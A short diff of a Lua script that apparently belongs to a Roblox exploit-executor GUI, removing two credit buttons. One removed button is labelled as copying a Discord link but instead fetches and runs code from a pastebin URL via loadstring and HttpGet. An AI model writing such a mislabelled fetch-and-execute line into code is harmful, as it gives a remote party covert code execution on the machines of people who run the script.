@@ -96,14 +96,6 @@ Antilog:CreateButton("Anti-Logger", function()
 })
 end)
 
-cred:CreateButton("Copy Discord Link", function()
-setclipboard("https://discord.gg/p4nS6mV")
-end)
-
-cred:CreateButton("Copy Wshuff's Discord"), function()
-loadstring(game:HttpGet("https://pastebin.com/raw/4EptL6r1",true))()
-end)
-
 local mouse = game:GetService("Players").LocalPlayer:GetMouse()
 local enabled = true
 mouse.KeyDown:Connect(function(key)
